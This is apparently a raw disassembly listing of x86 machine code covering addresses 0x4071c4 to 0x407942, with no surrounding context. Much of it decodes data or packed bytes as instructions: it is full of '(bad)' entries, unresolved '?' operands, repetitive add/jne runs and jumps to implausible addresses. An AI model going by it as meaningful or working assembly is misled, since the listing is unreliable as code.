  4071c4:	add    ebp,ecx
  4071c6:	mov    ah,0x2
  4071c8:	ret    0x7503
  4071cb:	add    dl,BYTE PTR [ebx]
  4071cd:	jmp    0xb5407486
  4071d2:	jbe    0x4071d6
  4071d4:	add    BYTE PTR [ebx],ah
  4071d6:	and    ecx,eax
  4071d8:	jmp    DWORD PTR [ebx+0x10000276]
  4071de:	adc    ecx,eax
  4071e0:	call   DWORD PTR [esi-0x1efffd8a]
  4071e6:	sbb    al,0xc1
  4071e8:	inc    DWORD PTR [ebp-0x1ffffd8a]
  4071ee:	or     al,0xc1
  4071f0:	jmp    FWORD PTR [eax+0x76]
  4071f3:	add    al,BYTE PTR [eax]
  4071f5:	mov    edx,0x67ffc0dd
  4071fa:	jno    0x4071fe
  4071fc:	add    BYTE PTR [eax+0x6affc0da],cl
  407202:	jno    0x407206
  407204:	add    BYTE PTR [edi+0x0],dl
  407207:	add    BYTE PTR [eax],al
  407209:	add    BYTE PTR [eax],al
  40720b:	fcmovnb st,st(0)
  40720d:	jmp    FWORD PTR [ecx+0x71]
  407210:	add    al,BYTE PTR [eax]
  407212:	ds fcmovnb st,st(0)
  407215:	jmp    FWORD PTR [ecx+esi*2+0x2]
  407219:	add    BYTE PTR [ebx],al
  40721b:	lahf   
  40721c:	sar    bh,0x6b
  40721f:	jno    0x407223
  407221:	add    BYTE PTR [eax-0x74],ch
  407224:	sar    bh,0x6e
  407227:	jno    0x40722b
  407229:	add    BYTE PTR [edx-0x64],ah
  40722c:	sar    bh,0x6d
  40722f:	jno    0x407233
  407231:	add    BYTE PTR [edi-0x74],bl
  407234:	sar    bh,0x60
  407237:	jno    0x40723b
  407239:	add    BYTE PTR [edi+0x5c],al
  40723c:	(bad)  
  40723d:	jmp    FWORD PTR [edi+0x71]
  407240:	add    al,BYTE PTR [eax]
  407242:	popa   
  407243:	dec    esp
  407244:	(bad)  
  407245:	jmp    DWORD PTR [edx+0x71]
  407248:	add    al,BYTE PTR [eax]
  40724a:	loopne 0x4072a6
  40724c:	(bad)  
  40724d:	(bad)  
  40724e:	inc    edi
  407250:	push   es
  407251:	add    BYTE PTR [eax],al
  407253:	push   esi
  407254:	sub    al,BYTE PTR [ecx+0x0]
  407257:	rol    BYTE PTR [esi],1
  407259:	add    BYTE PTR [eax],al
  40725b:	lea    ebp,[edx]
  40725d:	inc    ecx
  40725e:	add    BYTE PTR [ecx+0x11000006],ah
  407264:	sub    DWORD PTR [ecx+0x0],eax
  407267:	xchg   edx,eax
  407268:	push   es
  407269:	add    BYTE PTR [eax],al
  40726b:	or     ebp,DWORD PTR [ecx]
  40726d:	inc    ecx
  40726e:	add    BYTE PTR [eax],al
  407270:	add    BYTE PTR [eax],al
  407272:	add    BYTE PTR [eax],al
  407274:	push   ds
  407275:	push   es
  407276:	add    BYTE PTR [eax],al
  407278:	sub    al,0x78
  40727a:	(bad)  
  40727b:	call   ecx
  40727d:	add    eax,0x5dd0000
  407282:	add    BYTE PTR [eax],al
  407284:	fiadd  DWORD PTR ds:0x517c0000
  40728a:	(bad)  
  40728b:	dec    ecx
  40728d:	add    eax,0x516c0000
  407292:	(bad)  
  407293:	(bad)  
  407294:	fadd   QWORD PTR [edx+eax*1]
  407297:	add    ebx,eax
  407299:	inc    eax
  40729a:	add    eax,0x93cd407
  40729f:	or     edx,eax
  4072a1:	cmp    BYTE PTR ds:0x1134ac0f,cl
  4072a7:	adc    ebp,DWORD PTR [eax-0x5be8ead0]
  4072ad:	sub    al,0x19
  4072af:	sbb    esp,DWORD PTR [eax-0x43e0e2d8]
  4072b5:	in     al,0x21
  4072b7:	and    edi,DWORD PTR [eax-0x4bd8d9e0]
  4072bd:	sbb    al,0x2a
  4072bf:	sub    esi,DWORD PTR [eax]
  4072c1:	sbb    BYTE PTR [esi],ch
  4072c3:	das    
  4072c4:	mov    WORD PTR ds:0x11883332,ss
  4072ca:	ss aaa 
  4072cc:	jne    0x4072e1
  4072ce:	or     edi,DWORD PTR [edx]
  4072d0:	mov    cs,WORD PTR [edi]
  4072d2:	pop    es
  4072d3:	mov    ch,BYTE PTR ds:[ebx-0x1e]
  4072d7:	popa   
  4072d8:	add    BYTE PTR [eax],al
  4072da:	add    BYTE PTR [eax],al
  4072dc:	add    dh,dl
  4072de:	inc    edi
  4072df:	fisub  WORD PTR [ebp-0x2e]
  4072e2:	inc    ebx
  4072e3:	fisubr DWORD PTR [ecx-0x62]
  4072e6:	jg     0x4072be
  4072e8:	ins    DWORD PTR es:[edi],dx
  4072e9:	call   0xce97:0xa671d29b
  4072f0:	jne    0x407294
  4072f2:	xchg   ebx,eax
  4072f3:	retf   0xae79
  4072f6:	outs   dx,DWORD PTR ds:[esi]
  4072f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072f8:	pop    ebp
  4072f9:	stos   BYTE PTR es:[edi],al
  4072fa:	mov    esp,edx
  4072fc:	popa   
  4072fd:	xchg   esi,eax
  4072fe:	xchg   esi,ebx
  407300:	gs xchg edx,eax
  407302:	sbb    edx,0x69
  407305:	pop    esi
  407306:	mov    edi,0xdb5a6dd5
  40730b:	mov    ah,0x71
  40730d:	data16 xlat BYTE PTR ds:[ebx]
  40730f:	mov    eax,0xbcd36275
  407314:	jns    0x407364
  407316:	iret   
  407317:	sar    BYTE PTR [ebp+0x4a],0xab
  40731b:	test   BYTE PTR [edx-0x7977590a],al
  407321:	repnz mov ds:0xdefe8a8c,al
  407327:	nop
  407328:	mov    ?,edx
  40732a:	mov    edx,0xb7069294
  40732f:	cwde   
  407330:	xchg   esi,eax
  407331:	add    dh,BYTE PTR [ebx-0x51116564]
  407337:	mov    al,ds:0x64caea9e
  40733c:	mov    ds:0xa668c6d6,al
  407341:	add    BYTE PTR [eax],al
  407343:	add    BYTE PTR [eax],al
  407345:	add    dl,dl
  407347:	ret    0xaa6c
  40734a:	push   ds
  40734b:	(bad)  
  40734c:	jo     0x4072fc
  40734e:	sbb    al,BYTE PTR [ebx]
  407350:	cdq    
  407351:	jne    0x40737a
  407353:	je     0x4072ea
  407355:	jns    0x40737a
  407357:	js     0x4072ea
  407359:	jge    0x40736a
  40735b:	jl     0x4072ea
  40735d:	or     DWORD PTR [ebx],0x37452980
  407363:	inc    esp
  407364:	and    eax,0x21483349
  407369:	dec    ebp
  40736a:	aas    
  40736b:	dec    esp
  40736c:	sbb    eax,0x39503b51
  407371:	push   ebp
  407372:	inc    edi
  407373:	push   esp
  407374:	xor    eax,0x31584359
  407379:	pop    ebp
  40737a:	das    
  40737b:	pop    esp
  40737c:	sub    eax,0x9602b61
  407381:	and    eax,0x29052417
  407386:	adc    ebp,DWORD PTR [eax]
  407388:	add    DWORD PTR ds:0x30fd2bdf,ebp
  40738e:	fld    TBYTE PTR [edi]
  407390:	fnstenv [edi+eiz*8]
  407393:	xor    edx,ebp
  407395:	cmp    bl,ah
  407397:	aaa    
  407398:	sar    DWORD PTR [edi+ecx*8],1
  40739b:	cmp    ecx,ebp
  40739d:	inc    eax
  40739e:	retf   
  40739f:	aas    
  4073a0:	jmp    0xe543eaa9
  4073a5:	or     BYTE PTR [ebx+0x7],dh
  4073a8:	loope  0x4073b6
  4073aa:	add    BYTE PTR [eax],al
  4073ac:	add    BYTE PTR [eax],al
  4073ae:	add    BYTE PTR [edi+0xb],bh
  4073b1:	fst    QWORD PTR [eax]
  4073b3:	jnp    0x4073c4
  4073b5:	stc    
  4073b6:	adc    al,0x87
  4073b8:	adc    esi,ebp
  4073ba:	sbb    BYTE PTR [ebx+0x6f1cf117],al
  4073c0:	sbb    ebp,ebp
  4073c2:	and    BYTE PTR [ebx+0x1f],ch
  4073c5:	leave  
  4073c6:	in     al,0x54
  4073c8:	jecxz  0x40738e
  4073ca:	call   0xc1405b1f
  4073cf:	popa   
  4073d0:	jmp    0xeda630ff
  4073d5:	sbb    DWORD PTR cs:[eax-0xf],ebp
  4073d9:	xor    dl,BYTE PTR ds:0x1136f55c
  4073df:	push   eax
  4073e0:	stc    
  4073e1:	cmp    cl,BYTE PTR ds:0xa93f0074
  4073e7:	sbb    DWORD PTR [ecx-0x5af23a9e],esp
  4073ed:	shl    cx,0xa8
  4073f1:	push   0xffffffbd
  4073f3:	in     eax,0xac
  4073f5:	outs   dx,BYTE PTR ds:[esi]
  4073f6:	cdq    
  4073f7:	jmp    0xddd5e6ac
  4073fc:	mov    ah,0x76
  4073fe:	xchg   ecx,eax
  4073ff:	sar    DWORD PTR [eax-0x22ea52a6],1
  407405:	pop    esi
  407406:	mov    DWORD PTR [ecx],edi
  407408:	rol    DWORD PTR [edx-0x5b],0x2d
  40740c:	lds    eax,FWORD PTR [esi-0x5f]
  40740f:	ror    eax,0x4a
  407412:	popf   
  407413:	add    BYTE PTR [eax],al
  407415:	add    BYTE PTR [eax],al
  407417:	add    ch,al
  407419:	int3   
  40741a:	dec    esi
  40741b:	cmp    esi,eax
  40741d:	rcl    BYTE PTR [edx+0x35],1
  407420:	ret    0x56d4
  407423:	xor    DWORD PTR [esi+0xa4d7ad8],ebp
  407429:	mov    ebp,0x83f6697e
  40742e:	and    DWORD PTR [ebp-0xe],0xffffff87
  407432:	xchg   DWORD PTR [ecx-0x2],esp
  407435:	mov    ecx,DWORD PTR [ebx-0x707005a3]
  40743b:	jns    0x407443
  40743d:	xchg   esp,eax
  40743e:	xchg   ebx,eax
  40743f:	jne    0x407443
  407441:	cwde   
  407442:	xchg   edi,eax
  407443:	jno    0x407433
  407445:	fwait
  407446:	fwait
  407447:	ins    DWORD PTR es:[edi],dx
  407448:	jmp    0xa1a3:0x2c009f9f
  40744f:	mov    ds:0xa7a5a730,eax
  407454:	mov    ah,0xa9
  407456:	test   eax,0xadada8ab
  40745b:	scas   eax,DWORD PTR es:[edi]
  40745c:	cld    
  40745d:	mov    cl,0xb1
  40745f:	mov    bl,0x0
  407461:	mov    dh,0xb5
  407463:	mov    bh,0xe4
  407465:	mov    ecx,0xbdf8bbb9
  40746a:	mov    ebp,0xc1c18cbf
  40746f:	ret    
  407470:	nop
  407471:	(bad)
  407474:	push   esp
  407475:	leave  
  407476:	leave  
  407477:	retf   
  407478:	mov    ch,cl
  40747a:	int    0xcf
  40747c:	add    BYTE PTR [eax],al
  40747e:	add    BYTE PTR [eax],al
  407480:	add    BYTE PTR [ecx+edx*8-0x2f],bl
  407484:	shl    DWORD PTR [eax-0x2b],cl
  407487:	aad    0xd7
  407489:	inc    esp
  40748a:	(bad)  
  40748c:	fistp  DWORD PTR [eax-0x23]
  40748f:	fstp   st(7)
  407491:	ins    BYTE PTR es:[edi],dx
  407492:	loope  0x407475
  407494:	jecxz  0x407506
  407496:	in     eax,0xe5
  407498:	out    0x74,eax
  40749a:	jmp    0xed296088
  40749f:	in     eax,dx
  4074a0:	out    dx,eax
  4074a1:	mov    esp,0xc0f3f1f0
  4074a6:	hlt    
  4074a7:	cmc    
  4074a8:	mul    DWORD PTR [eax+edi*8-0x3470407]
  4074af:	std    
  4074b0:	dec    esp
  4074b2:	add    eax,DWORD PTR [eax]
  4074b4:	add    ch,cl
  4074b6:	add    DWORD PTR [eax],eax
  4074b8:	add    BYTE PTR [ecx+eax*1+0x19c0000],bl
  4074bf:	add    BYTE PTR [eax],al
  4074c1:	mov    WORD PTR [ecx],es
  4074c3:	add    BYTE PTR [eax],al
  4074c5:	mov    WORD PTR [ecx],es
  4074c7:	add    BYTE PTR [eax],al
  4074c9:	jne    0x4074f6
  4074cb:	add    eax,DWORD PTR [eax]
  4074cd:	jne    0x4074fa
  4074cf:	add    eax,DWORD PTR [eax]
  4074d1:	jne    0x4074fe
  4074d3:	add    eax,DWORD PTR [eax]
  4074d5:	jne    0x407502
  4074d7:	add    edi,edi
  4074d9:	jbe    0x407510
  4074db:	add    eax,DWORD PTR [eax]
  4074dd:	jne    0x40750c
  4074df:	add    eax,DWORD PTR [eax]
  4074e1:	jne    0x40750e
  4074e3:	add    eax,DWORD PTR [eax]
  4074e5:	add    BYTE PTR [eax],al
  4074e7:	add    BYTE PTR [eax],al
  4074e9:	add    BYTE PTR [ebp+0x2b],dh
  4074ec:	add    eax,DWORD PTR [eax]
  4074ee:	jne    0x40751b
  4074f0:	add    eax,DWORD PTR [eax]
  4074f2:	jne    0x40751f
  4074f4:	add    eax,DWORD PTR [eax]
  4074f6:	jne    0x407523
  4074f8:	add    eax,DWORD PTR [eax]
  4074fa:	jne    0x407527
  4074fc:	add    edi,edi
  4074fe:	jbe    0x40752b
  407500:	add    eax,DWORD PTR [eax]
  407502:	jne    0x40752f
  407504:	add    eax,DWORD PTR [eax]
  407506:	jne    0x407533
  407508:	add    eax,DWORD PTR [eax]
  40750a:	jne    0x407537
  40750c:	add    eax,DWORD PTR [eax]
  40750e:	jne    0x40753b
  407510:	add    eax,DWORD PTR [eax]
  407512:	jne    0x40753f
  407514:	add    eax,DWORD PTR [eax]
  407516:	jne    0x407543
  407518:	add    eax,DWORD PTR [eax]
  40751a:	jne    0x407547
  40751c:	add    eax,DWORD PTR [eax]
  40751e:	jne    0x407555
  407520:	aas    
  407521:	push   DWORD PTR [edx+0x2b]
  407524:	add    eax,DWORD PTR [eax]
  407526:	jne    0x407553
  407528:	add    eax,DWORD PTR [eax]
  40752a:	jne    0x407557
  40752c:	add    eax,DWORD PTR [eax]
  40752e:	jne    0x40755b
  407530:	add    eax,DWORD PTR [eax]
  407532:	jne    0x40755f
  407534:	add    eax,DWORD PTR [eax]
  407536:	jne    0x407563
  407538:	add    eax,DWORD PTR [eax]
  40753a:	jne    0x407567
  40753c:	add    eax,DWORD PTR [eax]
  40753e:	jne    0x40756b
  407540:	add    eax,DWORD PTR [eax]
  407542:	jne    0x4075b1
  407544:	aas    
  407545:	(bad)  
  407546:	jp     0x40754a
  407548:	jmp    0xe942ea50
  40754d:	add    eax,DWORD PTR [eax]
  40754f:	add    BYTE PTR [eax],al
  407551:	add    BYTE PTR [eax],al
  407553:	jne    0x407557
  407555:	jmp    0xe942ea5d
  40755a:	add    esi,DWORD PTR [ebp+0x2]
  40755d:	jmp    0xe942ea65
  407562:	add    esi,DWORD PTR [edx+0x0]
  407565:	ja     0x4075a6
  407567:	push   0xffffff84
  407569:	outs   dx,DWORD PTR ds:[esi]
  40756a:	aas    
  40756b:	bound  eax,QWORD PTR [ecx+ebp*8]
  40756e:	add    esi,DWORD PTR [ebp+0x2]
  407571:	jmp    0xe942ea79
  407576:	add    esi,DWORD PTR [ebp+0x2]
  407579:	jmp    0xe942ea81
  40757e:	add    esi,DWORD PTR [ebp+0x2]
  407581:	aas    
  407582:	aas    
  407583:	xor    bh,BYTE PTR [esi+esi*1]
  407586:	aas    
  407587:	sub    bh,BYTE PTR [esi+ebp*1]
  40758a:	aas    
  40758b:	and    bh,BYTE PTR [eax+ebp*8-0x16fd8afd]
  407592:	add    esi,DWORD PTR [ebp+0x2]
  407595:	jmp    0xe942ea9d
  40759a:	add    esi,DWORD PTR [ebp+0x2]
  40759d:	jmp    0xfe42eaa5
  4075a2:	ds repnz cmp esi,esi
  4075a6:	ds jmp 0xe8bb:0xe23eee3b
  4075ae:	add    esi,DWORD PTR [ebp+0x2]
  4075b1:	jmp    0xe942eab9
  4075b6:	add    eax,DWORD PTR [eax]
  4075b8:	add    BYTE PTR [eax],al
  4075ba:	add    BYTE PTR [eax],al
  4075bc:	jne    0x4075c0
  4075be:	jmp    0xe942eac6
  4075c3:	add    esi,DWORD PTR [ebp+0x2]
  4075c6:	mov    edi,0x3e753e
  4075cb:	call   0xe9387846
  4075d0:	jbe    0x4075d4
  4075d2:	js     0x4075bd
  4075d4:	jbe    0x4075d8
  4075d6:	add    cl,ch
  4075d8:	jbe    0x4075dc
  4075da:	add    cl,ch
  4075dc:	jbe    0x4075e0
  4075de:	add    cl,ch
  4075e0:	jbe    0x4075e4
  4075e2:	add    BYTE PTR [esi-0x1600c4c5],al
  4075e8:	jbe    0x4075ec
  4075ea:	add    cl,ch
  4075ec:	jbe    0x4075f0
  4075ee:	add    cl,ch
  4075f0:	jbe    0x4075f4
  4075f2:	sub    cl,0x76
  4075f5:	add    al,BYTE PTR [eax]
  4075f7:	jmp    0xe9407872
  4075fc:	jbe    0x407600
  4075fe:	add    cl,ch
  407600:	jbe    0x407604
  407602:	add    BYTE PTR [ecx+0x76],ch
  407605:	add    al,BYTE PTR [eax]
  407607:	jmp    0xe9407882
  40760c:	jno    0x40760f
  40760e:	add    al,ch
  407610:	jns    0x407614
  407612:	add    cl,ch
  407614:	jbe    0x407618
  407616:	add    cl,ch
  407618:	jbe    0x40761c
  40761a:	add    cl,ch
  40761c:	jbe    0x407620
  40761e:	add    cl,ch
  407620:	add    BYTE PTR [eax],al
  407622:	add    BYTE PTR [eax],al
  407624:	add    BYTE PTR [esi+0x2],dh
  407627:	add    al,ch
  407629:	jbe    0x40762d
  40762b:	add    BYTE PTR [ecx+0x76],ch
  40762e:	add    al,BYTE PTR [eax]
  407630:	imul   esi,esi,0x76e98081
  407636:	add    BYTE PTR [eax],0x5
  407639:	xchg   ebp,eax
  40763a:	push   ds
  40763b:	sbb    al,0xfd
  40763d:	jb     0x40765d
  40763f:	sbb    al,0xf5
  407641:	push   0x2
  407643:	add    cl,ch
  407645:	jbe    0x407649
  407647:	add    BYTE PTR [eax],0xcc
  40764a:	sbb    BYTE PTR [edx],bl
  40764c:	sbb    dl,BYTE PTR [esi-0x31ede5e8]
  407652:	adc    BYTE PTR [edx],dl
  407654:	adc    bh,BYTE PTR [esi-0x61ededf0]
  40765a:	adc    BYTE PTR [edx],dl
  40765c:	adc    cl,BYTE PTR [esi-0x71ededf0]
  407662:	adc    BYTE PTR [edx],dl
  407664:	or     BYTE PTR [esi+eax*1],0x80
  407668:	adc    BYTE PTR [eax+ebx*1+0x1c561a1a],cl
  40766f:	sbb    dl,BYTE PTR [edx]
  407671:	dec    esi
  407672:	adc    al,0x12
  407674:	adc    bh,BYTE PTR [esi]
  407676:	adc    al,0x12
  407678:	adc    bl,BYTE PTR [esi+0x14]
  40767b:	adc    dl,BYTE PTR [edx]
  40767d:	dec    esi
  40767e:	adc    al,0x12
  407680:	adc    cl,BYTE PTR [esi+0x14]
  407683:	adc    al,BYTE PTR [eax-0x134]
  407689:	add    BYTE PTR [eax],al
  40768b:	add    BYTE PTR [eax],al
  40768d:	add    BYTE PTR [esi+eax*1+0x0],cl
  407691:	add    BYTE PTR [esi+eax*1],bl
  407694:	add    BYTE PTR [eax],al
  407696:	sbb    al,0x6
  407698:	add    BYTE PTR [eax],al
  40769a:	or     al,0x6
  40769c:	add    BYTE PTR [eax],al
  40769e:	or     al,0x6
  4076a0:	add    BYTE PTR [eax],al
  4076a2:	sbb    al,0x6
  4076a4:	add    BYTE PTR [eax],al
  4076a6:	sbb    al,0x6
  4076a8:	add    BYTE PTR [eax],al
  4076aa:	or     al,0x6
  4076ac:	add    BYTE PTR [eax],al
  4076ae:	or     al,0x6
  4076b0:	add    BYTE PTR [eax],al
  4076b2:	fadd   QWORD PTR ds:0x5dc0000
  4076b8:	add    BYTE PTR [eax],al
  4076ba:	int3   
  4076bb:	add    eax,0x5cc0000
  4076c0:	add    BYTE PTR [eax],al
  4076c2:	fadd   QWORD PTR ds:0x2b750000
  4076c8:	add    eax,DWORD PTR [eax]
  4076ca:	jne    0x4076f7
  4076cc:	add    eax,DWORD PTR [eax]
  4076ce:	jne    0x4076fb
  4076d0:	add    eax,DWORD PTR [eax]
  4076d2:	jne    0x4076ff
  4076d4:	add    eax,DWORD PTR [eax]
  4076d6:	jne    0x407703
  4076d8:	add    eax,DWORD PTR [eax]
  4076da:	jne    0x407707
  4076dc:	add    eax,DWORD PTR [eax]
  4076de:	jne    0x40770b
  4076e0:	add    eax,DWORD PTR [eax]
  4076e2:	jne    0x40770f
  4076e4:	add    eax,DWORD PTR [eax]
  4076e6:	jne    0x407713
  4076e8:	add    eax,DWORD PTR [eax]
  4076ea:	jne    0x407717
  4076ec:	add    eax,DWORD PTR [eax]
  4076ee:	jne    0x40771b
  4076f0:	add    eax,DWORD PTR [eax]
  4076f2:	add    BYTE PTR [eax],al
  4076f4:	add    BYTE PTR [eax],al
  4076f6:	add    BYTE PTR [ebp+0x2b],dh
  4076f9:	add    eax,DWORD PTR [eax]
  4076fb:	jne    0x407728
  4076fd:	add    eax,DWORD PTR [eax]
  4076ff:	jne    0x40772c
  407701:	add    eax,DWORD PTR [eax]
  407703:	jne    0x407730
  407705:	add    eax,DWORD PTR [eax]
  407707:	jne    0x407734
  407709:	add    eax,DWORD PTR [eax]
  40770b:	jne    0x407738
  40770d:	add    eax,DWORD PTR [eax]
  40770f:	jne    0x40773c
  407711:	add    eax,DWORD PTR [eax]
  407713:	jne    0x407740
  407715:	add    eax,DWORD PTR [ecx]
  407717:	je     0x407744
  407719:	add    eax,DWORD PTR [eax]
  40771b:	jne    0x407748
  40771d:	add    eax,DWORD PTR [eax]
  40771f:	jne    0x40774b
  407721:	add    al,BYTE PTR [eax]
  407723:	jne    0x407778
  407725:	push   cs
  407726:	ret    0x494c
  407729:	call   0xdfcfc3ef
  40772e:	sub    BYTE PTR [ebp+0x79],0x4
  407732:	ret    0x503c
  407735:	or     al,0xc3
  407737:	lods   al,BYTE PTR ds:[esi]
  407738:	push   ds
  407739:	xor    esi,DWORD PTR fs:[eax]
  40773c:	pushf  
  40773d:	inc    esp
  40773e:	push   edx
  40773f:	pop    edi
  407740:	out    dx,al
  407741:	xor    ch,BYTE PTR [eax-0x6806fdfb]
  407747:	mov    ah,0xf3
  407749:	cmp    BYTE PTR [edx+edx*4],cl
  40774c:	mov    edi,?
  40774e:	adc    DWORD PTR gs:[edx-0x38],esi
  407752:	xor    DWORD PTR [eax+ecx*1-0x36],edx
  407756:	adc    dh,BYTE PTR [edx+ecx*4-0x1b]
  40775a:	cmp    al,BYTE PTR [eax]
  40775c:	add    BYTE PTR [eax],al
  40775e:	add    BYTE PTR [eax],al
  407760:	sysenter 
  407762:	test   eax,0x85faee12
  407767:	mov    ebp,0xf542f492
  40776c:	jl     0x4077c3
  40776e:	push   esi
  40776f:	adc    DWORD PTR [ebx+0x2259fe2e],ebp
  407775:	dec    ebx
  407776:	mov    eax,0x2e11540
  40777b:	mov    WORD PTR [ebx-0x70],?
  40777e:	add    BYTE PTR [eax+0x2f],cl
  407781:	jp     0x407800
  407783:	and    al,0x10
  407785:	std    
  407786:	leave  
  407787:	out    0x4d,eax
  407789:	stos   DWORD PTR es:[edi],eax
  40778a:	mov    dl,0x33
  40778c:	arpl   WORD PTR [ebp-0x5cbda531],cx
  407792:	xor    dl,BYTE PTR [esi+edx*1]
  407795:	cmp    bl,ah
  407797:	aam    0x7a
  407799:	push   eax
  40779a:	pop    ds
  40779b:	dec    edx
  40779c:	sub    dh,ah
  40779e:	and    esp,DWORD PTR [edx+0x74]
  4077a1:	pop    ecx
  4077a2:	mov    ah,0x25
  4077a4:	and    BYTE PTR [edx-0x5b],cl
  4077a7:	retf   0xd278
  4077aa:	iret   
  4077ab:	(bad)  
  4077ac:	pop    ecx
  4077ad:	paddw  mm6,QWORD PTR [edx+0x3996b922]
  4077b4:	mov    dl,0xa1
  4077b6:	outs   dx,DWORD PTR ds:[esi]
  4077b7:	push   edx
  4077b8:	loopne 0x40780e
  4077ba:	jmp    0xf0ec723b
  4077bf:	arpl   dx,bp
  4077c1:	jmp    0x0:0xc3ff
  4077c8:	add    al,al
  4077ca:	jb     0x407756
  4077cc:	or     ebp,DWORD PTR [edx-0x49]
  4077cf:	lods   al,BYTE PTR ds:[esi]
  4077d0:	cmc    
  4077d1:	push   ebx
  4077d2:	ret    0xb757
  4077d5:	dec    ebx
  4077d6:	and    DWORD PTR [eax+0x10],ebp
  4077d9:	(bad)  
  4077da:	sub    esp,DWORD PTR [eax+eiz*1-0x6421dbfc]
  4077e1:	js     0x4077f2
  4077e3:	ror    BYTE PTR [edi+0x78],cl
  4077e6:	pusha  
  4077e7:	sti    
  4077e8:	cwde   
  4077e9:	out    0x98,eax
  4077eb:	in     eax,dx
  4077ec:	hlt    
  4077ed:	scas   eax,DWORD PTR es:[edi]
  4077ee:	mov    ecx,0x2b1d24dc
  4077f3:	sbb    al,0x21
  4077f5:	mov    dh,0x69
  4077f7:	sub    ebp,edx
  4077f9:	enter  0x68cf,0xe9
  4077fd:	out    0x85,eax
  4077ff:	sub    al,0xea
  407801:	das    
  407802:	in     al,dx
  407803:	leave  
  407804:	int3   
  407805:	inc    eax
  407806:	mov    dl,0x60
  407808:	mov    al,ds:0x81952c50
  40780d:	shl    ch,cl
  40780f:	leave  
  407810:	mov    dl,0xfb
  407812:	xor    al,BYTE PTR [ebx+0x3fd220f4]
  407818:	adc    al,0xe8
  40781a:	les    edx,FWORD PTR [esi+0x2e]
  40781d:	and    edx,DWORD PTR [esp+ebx*2]
  407820:	xlat   BYTE PTR ds:[ebx]
  407821:	in     al,dx
  407822:	fdiv   QWORD PTR [ebp+0x30]
  407825:	ins    DWORD PTR es:[edi],dx
  407826:	test   BYTE PTR [esi-0x6],0x13
  40782a:	fdivp  st(4),st
  40782c:	jl     0x40782e
  40782e:	add    BYTE PTR [eax],al
  407830:	add    BYTE PTR [eax],al
  407832:	jmp    0xa6ca:0xe36e8a85
  407839:	dec    esi
  40783a:	sub    ebp,DWORD PTR [esi]
  40783c:	gs or  al,0x9d
  40783f:	inc    ecx
  407840:	leave  
  407841:	sbb    dh,cl
  407843:	out    0xcf,al
  407845:	add    BYTE PTR [ebx],dl
  407847:	adc    BYTE PTR [ebx+0x426e5494],0x0
  40784e:	xor    eax,0x4c000003
  407853:	std    
  407854:	(bad)  
  407855:	inc    DWORD PTR [ecx-0x19000002]
  40785b:	std    
  40785c:	(bad)  
  40785d:	jmp    FWORD PTR [eax+ecx*1-0x18f0000]
  407864:	(bad)  
  407865:	inc    DWORD PTR [edi]
  407867:	(bad)  
  407868:	(bad)  
  407869:	(bad)  
  40786a:	mov    esp,0x71000008
  40786f:	(bad)  
  407870:	(bad)  
  407871:	call   FWORD PTR [eax]
  407873:	(bad)  
  407874:	(bad)  
  407875:	call   FWORD PTR [eax+eax*1]
  407878:	add    BYTE PTR [eax],al
  40787a:	mov    cl,0x2
  40787c:	add    BYTE PTR [eax],al
  40787e:	cmp    esi,edi
  407880:	(bad)  
  407881:	dec    DWORD PTR [eax+eax*1]
  407884:	add    BYTE PTR [eax],al
  407886:	inc    ecx
  407887:	add    al,BYTE PTR [eax]
  407889:	add    BYTE PTR [edx-0x33000002],bh
  40788f:	cld    
  407890:	(bad)  
  407891:	push   DWORD PTR [ecx]
  407893:	add    al,BYTE PTR [eax]
  407895:	add    BYTE PTR [eax],al
  407897:	add    BYTE PTR [eax],al
  407899:	add    BYTE PTR [eax],al
  40789b:	jmp    0x40789b
  40789d:	(bad)  
  40789e:	(bad)  
  40789f:	mov    esp,0x7000000b
  4078a4:	(bad)  
  4078a5:	(bad)  
  4078a6:	dec    DWORD PTR [edx+eax*1+0x0]
  4078aa:	add    BYTE PTR [edx+eax*1],bl
  4078ad:	add    BYTE PTR [eax],al
  4078af:	sahf   
  4078b0:	retf   
  4078b1:	aas    
  4078b2:	add    BYTE PTR [esi-0x32],dh
  4078b5:	aas    
  4078b6:	add    BYTE PTR [edx+eax*1],cl
  4078b9:	add    BYTE PTR [eax],al
  4078bb:	xlat   BYTE PTR ds:[ebx]
  4078bc:	sar    DWORD PTR [edi],1
  4078be:	add    BYTE PTR [ebp+0x75003fce],ah
  4078c4:	jecxz  0x407875
  4078c6:	aas    
  4078c7:	jne    0x4078eb
  4078c9:	add    eax,DWORD PTR [eax]
  4078cb:	jne    0x4078f7
  4078cd:	add    eax,DWORD PTR [eax]
  4078cf:	jne    0x407894
  4078d1:	scas   eax,DWORD PTR es:[edi]
  4078d2:	aas    
  4078d3:	jne    0x4078fa
  4078d5:	add    eax,DWORD PTR [eax]
  4078d7:	jne    0x40785c
  4078d9:	add    eax,DWORD PTR [eax]
  4078db:	jne    0x407898
  4078dd:	scas   al,BYTE PTR es:[edi]
  4078de:	aas    
  4078df:	jne    0x40791a
  4078e1:	add    eax,DWORD PTR [eax]
  4078e3:	jne    0x407918
  4078e5:	add    eax,DWORD PTR [eax]
  4078e7:	jne    0x4078e0
  4078e9:	scas   eax,DWORD PTR es:[edi]
  4078ea:	aas    
  4078eb:	jne    0x407948
  4078ed:	add    eax,DWORD PTR [eax]
  4078ef:	jne    0x407914
  4078f1:	add    eax,DWORD PTR [eax]
  4078f3:	jne    0x407908
  4078f5:	mov    al,0x3f
  4078f7:	jne    0x40791b
  4078f9:	add    eax,DWORD PTR [eax]
  4078fb:	jne    0x407900
  4078fd:	add    al,0x0
  4078ff:	add    BYTE PTR [eax],al
  407901:	add    BYTE PTR [eax],al
  407903:	add    BYTE PTR [ebp+0x57],dh
  407906:	scas   eax,DWORD PTR es:[edi]
  407907:	aas    
  407908:	jne    0x407928
  40790a:	add    eax,DWORD PTR [eax]
  40790c:	jne    0x40792d
  40790e:	add    eax,DWORD PTR [eax]
  407910:	jne    0x40793c
  407912:	add    al,BYTE PTR [ecx]
  407914:	je     0x407940
  407916:	add    al,BYTE PTR [ecx]
  407918:	je     0x407944
  40791a:	add    al,BYTE PTR [ecx]
  40791c:	je     0x407948
  40791e:	add    al,BYTE PTR [ecx]
  407920:	jbe    0x40794a
  407922:	add    al,BYTE PTR [ecx]
  407924:	je     0x407950
  407926:	add    al,BYTE PTR [ecx]
  407928:	je     0x407954
  40792a:	add    eax,0x5297401
  40792f:	add    dh,BYTE PTR [edi+0x29]
  407932:	add    eax,0xff297702
  407937:	add    edi,DWORD PTR [ecx+0x29]
  40793a:	add    eax,0x5297102
  40793f:	add    dh,BYTE PTR [edi+0x2]
  407942:	jmp    0x407949
